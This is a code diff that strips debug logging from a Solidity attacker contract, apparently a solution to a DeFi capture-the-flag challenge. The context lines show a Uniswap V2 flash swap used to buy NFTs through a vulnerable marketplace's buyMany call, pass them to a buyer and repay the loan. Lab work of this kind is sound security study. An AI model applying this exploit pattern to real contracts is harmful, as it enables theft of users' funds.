@@ -8,7 +8,6 @@ import "@openzeppelin/contracts/utils/Address.sol";
 import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
 import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
-import "hardhat/console.sol";
 
 contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
     using Address for address payable;
@@ -31,15 +30,10 @@ contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
     }
 
     function attack(address _nftMarketPlace) external {
-        console.log("nft balance: ", nft.balanceOf(address(this)));
-
         pair.swap(15 ether, 0, address(this), abi.encode(_nftMarketPlace));
-        console.log("nft balance: ", nft.balanceOf(address(this)));
         for (uint256 i = 0; i < 6; i++) {
             nft.safeTransferFrom(address(this), buyer, i);
         }
-        console.log("buyer: ", buyer);
-        console.log("nft balance: ", nft.balanceOf(address(this)));
     }
 
     function uniswapV2Call(
@@ -62,8 +56,6 @@ contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
             abi.encodeWithSignature("buyMany(uint256[])", tokenIds),
             amount0
         );
-
-        console.log("balance of this", address(this).balance);
 
         // amount borrowed + 0.3% fee
         uint256 amountToRepay = 1 + (amount0 * 1000) / 997;
